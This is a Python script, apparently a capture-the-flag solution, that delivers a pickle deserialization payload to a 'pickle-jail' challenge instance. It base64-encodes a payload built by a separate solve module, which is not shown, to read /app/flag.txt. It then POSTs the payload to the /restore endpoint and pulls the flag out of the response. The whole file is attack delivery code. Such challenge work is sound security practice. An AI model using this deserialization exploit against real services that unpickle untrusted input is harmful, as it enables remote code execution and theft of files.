#!/usr/bin/env python3
"""Fire the pickle-jail payload at a deployed 'pickle' instance and print the flag.
Usage: python send.py https://<instance-host>
"""
import sys, json, base64, urllib.request
from solve import build_payload

def main():
    if len(sys.argv) < 2:
        print("usage: python send.py <BASE_URL>")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    payload = build_payload("/app/flag.txt")
    b64 = base64.b64encode(payload).decode()
    body = json.dumps({"payload": b64}).encode()
    req = urllib.request.Request(base + "/restore", data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        data = json.loads(r.read().decode())
    print("ok:", data.get("ok"))
    print("disassembled:", data.get("disassembled"))
    print("=== VAULT OUTPUT ===")
    print(data.get("output", ""))
    out = data.get("output", "") or ""
    import re
    m = re.search(r"pwnsec\{[^}]*\}", out)
    if m:
        print("\n>>> FLAG:", m.group(0))

if __name__ == "__main__":
    main()
